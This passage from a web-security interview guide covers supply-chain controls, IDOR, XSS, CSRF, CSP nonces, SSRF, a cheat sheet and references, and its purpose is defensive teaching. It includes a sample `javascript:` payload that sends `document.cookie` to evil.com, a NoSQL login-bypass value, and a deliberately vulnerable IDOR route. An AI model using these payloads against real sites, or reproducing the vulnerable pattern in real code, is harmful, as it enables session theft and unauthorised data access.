This is the threat that grew fastest and gets skipped most in answers, so I'd start by naming the shapes: typosquatting, **dependency confusion** (a public package shadowing your private internal one), **compromised maintainer accounts** (the most damaging, because the package is already in everyone's lockfile), malicious `postinstall` scripts, and compromised CDN-hosted third-party tags.

The controls, roughly by impact:

```bash
npm ci                        # install from the lockfile only — never `npm install` in CI
npm ci --ignore-scripts       # removes the entire install-time RCE class
npm audit signatures          # verify provenance attestations
```

- **`--ignore-scripts` by default**, allowlisting the few packages that genuinely need native builds. A malicious `postinstall` in CI runs where your deploy credentials live.
- **Verify provenance** — attestation proves which repo and workflow built the package, which defeats a lot of account-compromise scenarios.
- **Renovate/Dependabot with a review gate.** Automated detection, human merge. Auto-merging dependency updates is auto-merging supply-chain risk.
- **Minimise dependencies.** A 4-line utility package is a permanent trust relationship for something you could write. This is a real argument for native `fetch`, `node:test` and `structuredClone` over npm equivalents.
- **Separate CI privileges** — the job that installs dependencies shouldn't hold production deploy credentials, so an install-time compromise can't reach production.
- **Audit the transitive graph**, not the direct list. The risk lives in the depth.

For the **browser** side: every third-party `<script>` is a full-privilege participant in your origin — it can read your DOM, your non-`HttpOnly` cookies and your `localStorage`. **Subresource Integrity** pins a hash so a modified CDN file is refused, but it can't protect a script *designed* to change (most analytics loaders), which is why SRI is under-used. For those, the controls are a strict CSP constraining what the script can reach, sandboxed iframes where feasible, and a hard rule that marketing can't add tags without review.

---

**Q6: A pen test reports that any logged-in user can read any other user's invoice by changing the URL ID. Fix it and explain the class.**

That's **IDOR** — insecure direct object reference — and it's a *confused identity* failure: the server authenticated the user but never checked whether that user may access that object. It's the most common real vulnerability in business applications, and it's boring rather than exotic.

```js
// ✗ Vulnerable — authenticated but not authorised
app.get('/api/invoices/:id', auth, async (req, res) => {
  res.json(await db.invoices.findById(req.params.id));
});

// ✓ Scope the QUERY to the authenticated principal
app.get('/api/invoices/:id', auth, async (req, res) => {
  const invoice = await db.invoices.findOne({
    _id: req.params.id,
    orgId: req.user.orgId,        // ownership is part of the query
  });
  if (!invoice) return res.sendStatus(404);
  res.json(invoice);
});
```

Two decisions in there that show experience. **Scope the query rather than fetching then checking** — a `findById` followed by an `if` is one refactor away from being wrong, whereas a scoped query structurally cannot return someone else's row. And **return 404, not 403**, because 403 confirms the resource exists, which is an enumeration oracle.

Then I'd fix the class rather than the instance, because if one endpoint has it, others do:

- **A data-access layer** where every query takes the principal and scopes itself. Make the unsafe version hard to write.
- **Audit every endpoint taking an ID from the caller** — and every Server Action and GraphQL resolver, which are the ones people forget.
- **Automated tests per role**: user A must get 404 on user B's resources. This is cheap and catches regressions permanently.
- **UUIDs instead of sequential integers** — not an access control, but it removes trivially scriptable enumeration.

And I'd check the adjacent failures in the same family: **mass assignment** (`Object.assign(user, req.body)` letting a caller set `role: 'admin'`) and **over-fetching in responses**, where the API returns the whole record and the UI hides fields — the data is still in the payload.

---

### Advanced

---

**Q7: Design a frontend security architecture against XSS, CSRF, token theft, and supply chain attacks.**

Four different threats needing four different controls — the mistake is treating them as one "security" bucket. I'd lay it out as layers with an explicit answer to "what if this one fails?"

**XSS.** Root fix: never inject unsanitised HTML — no `dangerouslySetInnerHTML` with untrusted input, DOMPurify where user HTML is genuinely required, an allowlist on URL schemes for `href`/`src`, and treat markdown and LLM output as untrusted. Second layer: a **nonce + `strict-dynamic` CSP** with `object-src 'none'` and `base-uri 'self'`. Third layer: **Trusted Types**, which makes the DOM sinks refuse plain strings — the structural fix, because it converts "audit every sink forever" into "audit a few policies."

**CSRF.** `SameSite=Lax` (or `Strict`) as the baseline, but not alone: `Lax` still allows top-level cross-site GET, and `SameSite` is site-scoped so subdomains count. So also an anti-CSRF token on every state-changing request, `Origin`/`Sec-Fetch-Site` validation, and the rule that `GET` never mutates. The **`__Host-` cookie prefix** closes the subdomain injection hole that weakens both `SameSite` and double-submit tokens.

**Token theft.** Architectural, not obfuscatory, because any token JS can read is XSS-exfiltratable: **BFF pattern**, `HttpOnly; Secure; SameSite=Lax` cookies, tokens never in `localStorage`. Plus short access-token lifetimes, refresh rotation with **reuse detection** (revoke the whole family on reuse — rotation without detection is half a control), single-flight refresh to handle the multi-tab race, session regeneration on privilege change, and a CSP restricting `connect-src`/`img-src` so exfiltration is blocked even if injection succeeds.

**Supply chain.** Lockfiles with `npm ci`, `--ignore-scripts` by default, provenance verification, Renovate with a review gate, SRI on any third-party script you must load from a CDN, separated CI privileges, and a minimised dependency count. Structurally: third-party tags go through a tag manager you control, not inline `<script>` added by marketing.

**Cross-cutting headers**: HSTS, `nosniff`, `frame-ancestors`, `Referrer-Policy: strict-origin-when-cross-origin` (so URLs with tokens in query strings don't leak), and a `Permissions-Policy` denying what you don't use.

**And the organisational half**, which is what makes it hold: fix these in the **design system and the shared API client** so every product inherits them; put `eslint-plugin-security`-style rules and secret scanning in CI; add security acceptance criteria to the definition of done; and run a pen test against the model rather than the code. A security architecture that depends on every engineer remembering will decay — one where the safe path is the easy path won't.

---

**Q8: Your Node API fetches a URL supplied by the user to generate link previews. What's the risk and how do you fix it?**

**SSRF** — server-side request forgery. The attacker supplies a URL pointing at infrastructure only your server can reach, and your server fetches it and hands back the response.

The high-value targets: **cloud instance metadata** at `169.254.169.254`, which on a misconfigured instance returns IAM credentials; `localhost` and private subnets (admin panels, Redis, Elasticsearch, Kubernetes API); internal DNS names; and non-HTTP schemes like `file://` or `gopher://` for reading local files or smuggling protocols.

The defences, and the ordering matters because the obvious ones are insufficient:

1. **Allowlist destination hosts** where the use case permits it. Strongest control, rarely possible for a general link-preview feature.
2. **Resolve DNS yourself and validate the resolved IP**, rejecting private, loopback, link-local and reserved ranges. Validating the *hostname* is not enough — `attacker.com` can simply have an A record pointing at `169.254.169.254`.
3. **Re-validate after every redirect**, or block redirects entirely. A permitted URL can 302 straight to an internal address, which is the bypass for a naive check.
4. **Guard against DNS rebinding** — the classic bypass is a hostname that resolves to a public IP when you validate and a private one when you connect. Fix by resolving once and **connecting to the validated IP** with the `Host` header set, rather than resolving twice.
5. **Restrict the scheme** to `http`/`https` only.
6. **Cap response size and timeout**, so this isn't also a memory-exhaustion or slowloris vector.
7. **Don't return the raw response.** A link preview needs a title, a description and an image URL — parse and return only those. Echoing the body back turns SSRF into a full read primitive.

The control I'd argue for hardest, though, is **network-level**: run this fetcher in a **separate egress-only environment** with no route to internal networks and no instance-metadata access (or IMDSv2 with a hop limit of 1). Then a bypass in the application logic — and given the redirect and rebinding tricks, assume there will be one — reaches nothing worth having. That's the defence-in-depth answer, and it's what distinguishes an architectural response from a validation-function response.

---

## 13. Tricky Questions

---

**Q1: This React code has an XSS vulnerability. React escapes everything, so where is it?**

```jsx
function Profile({ user }) {
  return (
    <div>
      <h1>{user.name}</h1>
      <a href={user.website}>Visit site</a>
      <img src={user.avatar} alt="" />
    </div>
  );
}
```

**Answer:** `href={user.website}` — a `javascript:` URL executes when clicked. React escapes **text**, not URL schemes.

**Explanation:**

React's automatic escaping applies to text children and attribute *values*, which correctly prevents `user.name` containing `<script>` from doing anything. What it does **not** do is validate that a URL is a navigational URL rather than a code-execution URL.

```jsx
user.website = "javascript:fetch('https://evil.com?c='+document.cookie)";
// Renders <a href="javascript:...">. Clicking it runs the script in your origin.
```

React 16+ warns about this in development and blocks some cases, but the reliable fix is your own **scheme allowlist**:

```jsx
function safeUrl(url) {
  if (typeof url !== 'string') return '#';
  return /^(https?:|mailto:|tel:|\/|#)/i.test(url.trim()) ? url : '#';
}
<a href={safeUrl(user.website)} rel="noopener noreferrer">Visit site</a>
```

Two subtleties in that regex. **Trim first** — leading whitespace and control characters are stripped by the URL parser, so `" javascript:alert(1)"` and `"java\tscript:alert(1)"` are live payloads that a naive `startsWith('javascript:')` check misses. And **anchor the test**, or `https://x.com#javascript:` style tricks and scheme-relative confusion creep in.

The same class applies to every URL-ish attribute: **`src`** (on `iframe`, and `data:text/html` in some contexts), **`formaction`** on a button (which overrides the form's action and is very easy to miss), **`xlink:href`** in SVG, and **`srcdoc`** on an iframe, which is a full HTML sink.

`img src` is comparatively safe — `javascript:` in `src` doesn't execute in modern browsers — but it's still an **exfiltration** channel, because the browser will make a request to whatever host is named, carrying data in the query string. That's exactly the trick from the AI & LLM Engineering guide: a rendered image URL is an outbound channel even when nothing "executes."

**Takeaway:** React escapes text but does not validate URL schemes, so `href`/`src`/`formaction`/`srcdoc` interpolation needs a scheme allowlist applied to a trimmed, anchored check — and image URLs remain a data-exfiltration channel even though they don't execute.

---

**Q2: Your API uses `HttpOnly` cookies and rejects requests without a valid CSRF token. An attacker still forges authenticated requests. The tokens are validated correctly. How?**

**Answer:** A subdomain. `SameSite` is *site*-scoped, not origin-scoped, and a double-submit CSRF cookie can be set by any subdomain — so an XSS or a takeover on `blog.example.com` defeats both controls against `app.example.com`.

**Explanation:**

Both defences assume "cross-site" means "cross-origin." It doesn't.

**`SameSite` operates on the registrable domain** (the eTLD+1). `blog.example.com` and `app.example.com` are the **same site**, so a request from the blog to the app is *not* cross-site and the session cookie is sent normally. `SameSite` contributes nothing here.

**Double-submit CSRF breaks the same way.** The scheme compares a token in a cookie against a token in a header or body field. But cookies are shared across subdomains when `Domain=.example.com` is set, and — critically — **any subdomain can set a cookie for the parent domain**. So an attacker controlling `blog.example.com` writes `csrf=known-value` scoped to `.example.com`, then sends a forged request including `X-CSRF-Token: known-value`. Both halves match. Validation passes.

How the attacker gets a subdomain: XSS on a marketing page, a **dangling DNS record** pointing at a decommissioned cloud resource they can claim (subdomain takeover — very common), a compromised third-party service on a CNAME'd subdomain, or a user-content subdomain that serves uploaded HTML.

The fixes:

1. **`__Host-` cookie prefix.** A cookie named `__Host-session` is accepted **only** if it's `Secure`, has `Path=/`, and has **no `Domain` attribute** — so it's locked to the exact host and **cannot be set or overwritten by a subdomain**. This closes the hole directly and is the single best control here.
2. **Bind the CSRF token to the session** — sign it with a server-side secret, or use a stateful synchroniser token. Now an attacker-planted value fails verification because it isn't bound to *this* session.
3. **Validate `Origin`** (or `Sec-Fetch-Site`) on state-changing requests, which *is* origin-scoped and does distinguish the subdomain.
4. **Treat subdomains as untrusted.** Serve user content from a wholly separate registrable domain, and audit DNS for dangling records.

The generalisable lesson: **"same-site" is a much weaker boundary than "same-origin."** Any control expressed in site terms — `SameSite`, domain-scoped cookies, some CSP directives — is only as strong as your least-secure subdomain.

**Takeaway:** `SameSite` and domain-scoped cookies operate on the registrable domain, so a hostile subdomain is same-site — use the `__Host-` prefix, session-bound signed CSRF tokens and `Origin` validation, and treat every subdomain as part of your attack surface.

---

**Q3: You add a strict CSP with a nonce. It blocks nothing — an injected `<script>` still runs. The header is present and correct. Why?**

**Answer:** Almost certainly the nonce is static (or predictable) across responses, or `'unsafe-inline'` is still present without a nonce/hash also being set, or the policy is in `Report-Only` mode.

**Explanation:**

CSP nonces work on a single assumption: **the attacker cannot know the nonce.** Every way of breaking that produces exactly this symptom — a header that looks right and does nothing.

**1. A static nonce.** Hard-coded in a template, in an env var, or generated at build time:

```
# ✗ Every response has the same nonce → the attacker reads it from the page
Content-Security-Policy: script-src 'nonce-abc123'
```

An injected script just includes `nonce="abc123"` and executes. The nonce must be **cryptographically random and regenerated per response**. Generated per *build* is the subtle version of this bug, because it looks dynamic in code review.

**2. `'unsafe-inline'` still present.** Note the interaction carefully, because it's the opposite of what people assume: when a nonce **or** hash is present, browsers **ignore** `'unsafe-inline'` — which makes it a safe legacy fallback. But if the nonce is missing, malformed, or on a different directive than the one being evaluated, `'unsafe-inline'` is honoured and everything runs.

**3. `Report-Only` mode.** `Content-Security-Policy-Report-Only` reports violations and blocks nothing. Correct for a rollout, and very easy to leave enabled and forget.

**4. Wrong directive.** A nonce on `script-src` doesn't govern `script-src-elem`/`script-src-attr` if those are separately specified, and it doesn't cover `style-src`.

**5. Framework injection.** The nonce has to reach the actual `<script>` tags — including those your framework emits for hydration. If your bundler injects tags without the nonce, you'll add `'unsafe-inline'` to make the site work, and you're back to case 2.

**The structural problem behind all of this** is worth raising: a **statically-hosted SPA cannot do per-response nonces**, because there's no server rendering the document. Teams hit that, add `'unsafe-inline'` to make things work, and ship a policy that provides no XSS protection at all. The honest options are hash-based CSP for known inline scripts, rendering the document at the edge, or accepting a weaker policy and being clear-eyed that XSS protection now rests entirely on the sink fixes.

How to verify rather than hope: check the response headers on a real request, confirm the nonce **differs between two loads**, and read the browser console — CSP violations are logged with the directive that blocked them, so silence means nothing is being blocked.

**Takeaway:** a CSP nonce only works if it's cryptographically random per response and actually reaches every script tag — a static nonce, a leftover honoured `'unsafe-inline'`, or `Report-Only` mode all produce a header that looks strict and blocks nothing.

---

**Q4: Your CI is compromised through a dependency and production credentials are stolen. Every dependency was pinned and `npm audit` was clean. What went wrong, and what would have prevented it?**

**Answer:** A pinned version doesn't help when the compromise arrives in a *new* version you then install, and `npm audit` only reports **known** vulnerabilities — it says nothing about a package that is malicious and undisclosed. The credential theft happened because the install job had production credentials in its environment.

**Explanation:**

Three separate misconceptions, each a common one.

**Pinning protects against unexpected upgrades, not against malicious ones.** Pinning means you install exactly what you asked for. If a maintainer account is compromised and a malicious `1.2.4` is published, pinning `1.2.3` protects you — right up until Renovate opens a PR bumping to `1.2.4` and CI merges it. And **transitive dependencies** are where the real exposure sits: your lockfile pins them, but any dependency update refreshes a subtree you never reviewed.

**`npm audit` is a known-vulnerability scanner, not a malware scanner.** A freshly-published malicious version has no advisory — that's the entire attack window. Audit is necessary and detects nothing about the case that actually happened.

**The credentials were the real failure.** A malicious `postinstall` script runs arbitrary code as part of `npm install`, with full access to the environment. If the install step's environment contains production deploy credentials, a supply-chain compromise becomes a production compromise immediately.

What would have prevented or contained it, in order of effectiveness:

1. **`npm ci --ignore-scripts`.** Most packages don't need install scripts; allowlist the handful doing native builds. This removes the entire install-time RCE class and is a one-flag change.
2. **Separate CI privileges.** The job that installs dependencies must not hold production credentials. Install and build in one job with no secrets, then deploy from a separate job with short-lived, scoped credentials (OIDC federation rather than long-lived keys). This is what turns a compromise into an inconvenience.
3. **Provenance verification** (`npm audit signatures`) — attestation proves which repo and workflow built the package, defeating many account-compromise scenarios.
4. **A review gate on dependency updates.** Automated detection, human merge. Auto-merging updates is auto-merging supply-chain risk.
5. **Egress restrictions in CI**, so exfiltration to an arbitrary host fails even if code runs.
6. **Fewer dependencies.** Every package is a permanent trust relationship. A 4-line utility isn't worth one.

The framing to end on: **you cannot audit your way out of this** — nobody reviews a thousand transitive packages per update. The realistic posture is **assume a dependency will eventually be malicious and make that survivable**: no secrets in the install environment, no install scripts, restricted egress, short-lived scoped deploy credentials, and a blast radius small enough that the answer is "rotate and move on."

**Takeaway:** pinning prevents surprise upgrades and `npm audit` finds only *known* issues, so neither stops a freshly-published malicious version — contain it instead with `--ignore-scripts`, an install job that holds no production credentials, restricted CI egress, and short-lived scoped deploy tokens.

---

## 14. Cheat Sheet

```
PRINCIPLES
 1. Three failure classes: confused IDENTITY (CSRF, IDOR, fixation), confused
    DATA/CODE (XSS, SQLi, prototype pollution), confused TRUST (supply chain).
 2. Defence in depth — no single control is trusted to hold. Always answer
    "what if this layer fails?"
 3. THE CLIENT IS NEVER A SECURITY BOUNDARY. Hidden fields, disabled buttons,
    client validation, route guards — all UX. Enforce server-side.

XSS
 4. Stored / reflected / DOM-based. DOM-based can live in the FRAGMENT, which the
    browser never sends — so WAFs, server escaping and logs never see it.
 5. The fix is CONTEXTUAL OUTPUT ENCODING. Escaping depends on context: HTML text,
    attribute, URL, script, CSS all differ.
 6. React escapes TEXT, not URL SCHEMES. href/src/formaction/srcdoc need a scheme
    allowlist on a TRIMMED, ANCHORED test (whitespace and \t defeat naive checks).
 7. Rendering user HTML? DOMPurify, never a regex. HTML isn't regular; mutation XSS
    exists; maintained sanitisers get updated, your regex won't.
 8. Sanitise on OUTPUT, not input. Store what the user typed.
 9. Sinks: innerHTML/outerHTML/insertAdjacentHTML, document.write, eval,
    new Function, string setTimeout, srcdoc, jQuery $()/.html().
10. Modern sinks: markdown (raw HTML by default), LLM output, SVG uploads,
    postMessage without an origin check, window.opener.

CSP & TRUSTED TYPES
11. CSP LIMITS what an injection can do. It does not fix the injection.
12. Host allowlists are obsolete (JSONP + open redirects bypass them).
    Use: script-src 'nonce-{RANDOM}' 'strict-dynamic' https:
13. The nonce must be CRYPTO-RANDOM PER RESPONSE. Static or per-build = worthless.
14. Also: object-src 'none'; base-uri 'self' (blocks injected <base>);
    frame-ancestors.
15. 'unsafe-inline' defeats script-src — BUT a nonce/hash makes browsers ignore it,
    so it's a safe legacy fallback. 'unsafe-eval' reopens the eval sink.
16. Roll out with Content-Security-Policy-Report-Only first. Expect extension noise.
17. A statically-hosted SPA CAN'T do per-response nonces → hash-based CSP, edge
    rendering, or accept a weaker policy knowingly.
18. Trusted Types (require-trusted-types-for 'script') makes DOM sinks REFUSE plain
    strings → "audit every sink forever" becomes "audit a few policies".

CSRF
19. CSRF is WRITE-only (SOP blocks reading the response). XSS is read AND write.
20. SameSite=Lax is necessary, NOT sufficient: still sent on top-level cross-site
    GET; SameSite is SITE-scoped so subdomains are same-site.
21. Anti-CSRF token is the actual control (attacker can't read your origin).
    Synchroniser (stateful) or SIGNED double-submit.
22. Validate Origin / Sec-Fetch-Site. NEVER let GET mutate state.
23. Authorization-header tokens aren't CSRF-vulnerable. HttpOnly COOKIE auth IS —
    being "an API" doesn't exempt you.

TOKENS & SESSIONS
24. ANY token JS can read is XSS-exfiltratable. localStorage is the worst common
    choice (persistent, replayable).
25. BFF pattern: browser holds an opaque HttpOnly session cookie; the BFF holds the
    real tokens. The browser NEVER sees an access token.
26. Cookies: HttpOnly; Secure; SameSite=Lax; and the __Host- PREFIX so a subdomain
    can't set or overwrite it.
27. Short access tokens + refresh ROTATION + REUSE DETECTION (revoke the family).
    Rotation without detection is half a control.
28. Single-flight refresh (BroadcastChannel / navigator.locks) for the multi-tab race.
29. Regenerate the session ID on login and privilege change → session fixation.
30. A stateless JWT CANNOT be revoked before expiry. Pin the expected alg (alg:none,
    RS256→HS256 confusion). Opaque server-side sessions are the better default.
31. IDOR: SCOPE THE QUERY to the principal, don't validate the caller's ID.
    Return 404, not 403 (403 confirms existence).

CLICKJACKING & SUPPLY CHAIN
32. frame-ancestors supersedes X-Frame-Options. Re-auth for destructive actions.
33. Never combine iframe sandbox allow-scripts WITH allow-same-origin for untrusted
    content — together they let the frame escape the sandbox.
34. npm ci (lockfile only) + --ignore-scripts by default + npm audit signatures.
35. Pinning stops surprise upgrades, NOT malicious new versions.
    npm audit finds KNOWN issues only — a fresh malicious publish has no advisory.
36. THE INSTALL JOB MUST NOT HOLD PRODUCTION CREDENTIALS. Separate install/build
    from deploy; short-lived OIDC-federated deploy creds; restrict CI egress.
37. Renovate/Dependabot with a REVIEW GATE. Auto-merge = auto-merged risk.
38. Every third-party <script> has full privileges in your origin. SRI pins a hash
    but can't protect a script designed to change (analytics) → CSP + review gate.
39. Fewer dependencies. Prefer platform APIs (fetch, node:test, structuredClone).

OTHER INJECTION
40. SQL: parameterise. Identifiers can't be parameterised → allowlist.
41. NoSQL: validate TYPES ({"$ne":null} in a JSON body logs you in).
42. Command: execFile with an ARRAY, never a shell string.
43. SSRF: allowlist hosts → resolve DNS and validate the RESOLVED IP → re-validate
    after redirects → connect to the validated IP (DNS rebinding) → don't echo the
    body → and run the fetcher in an egress-only network with no metadata access.
44. Path traversal: path.resolve then verify it's still inside the base dir.
45. Prototype pollution: reject __proto__/constructor/prototype; Object.create(null)
    or Map for user-keyed data.
46. ReDoS hangs the event loop → whole process down. Open redirect is a phishing
    primitive. Mass assignment: pick fields explicitly.

SECRETS & AUTH
47. NEXT_PUBLIC_* / VITE_* / REACT_APP_* are PUBLISHED, not configured.
    A key in a mobile binary is public.
48. A leaked secret must be ROTATED, not deleted — history, forks and clones keep it.
49. Never log secrets, including inside error objects and header dumps.
50. Argon2id (or bcrypt). Never SHA-256 — fast is exactly wrong for passwords.
51. Rate limit per IP AND per account AND globally. Prefer back-off over lockouts
    (lockouts are a DoS vector).
52. Credential stuffing > brute force. Check against breached-password lists.
53. Don't leak account existence — identical messages AND identical timings.
54. crypto.timingSafeEqual for secrets; === short-circuits and leaks via timing.
55. Passkeys/WebAuthn are phishing-resistant (origin-bound). SMS OTP is weakest.
    Don't block paste in OTP fields (WCAG 2.2 SC 3.3.8).
56. Invalidate ALL sessions on password change, not just the current device.

HEADERS
57. Strict-Transport-Security (preload is near-irreversible), CSP,
    X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin
    (stops URL tokens leaking), Permissions-Policy denying unused capabilities,
    COOP/COEP/CORP for cross-origin isolation (roll out in report-only — they break
    third-party embeds).
58. X-XSS-Protection is OBSOLETE — the auditors were bypassable and exploitable.
    Set 0 or omit.
```

---

## 15. References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — the canonical list, with the threat model behind each entry
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — the single most useful practical resource here
- [OWASP — XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [DOM-based XSS](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP — CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP — SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [web.dev — Strict CSP](https://web.dev/articles/strict-csp) — the nonce + `strict-dynamic` rationale
- [web.dev — Trusted Types](https://web.dev/articles/trusted-types) — the structural DOM-XSS fix
- [MDN — HTTP Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) and [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [DOMPurify](https://github.com/cure53/DOMPurify) — the sanitiser to use, and its bypass history is instructive reading
- [Mozilla Observatory](https://developer.mozilla.org/en-US/observatory) — scan a live site's headers
- [SecurityHeaders.com](https://securityheaders.com) — quick header grading
- [Have I Been Pwned — Pwned Passwords](https://haveibeenpwned.com/Passwords) — k-anonymity API for breached-password checks
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) — the requirements checklist to audit a design against
- [npm — Generating provenance attestations](https://docs.npmjs.com/generating-provenance-statements) — supply-chain verification
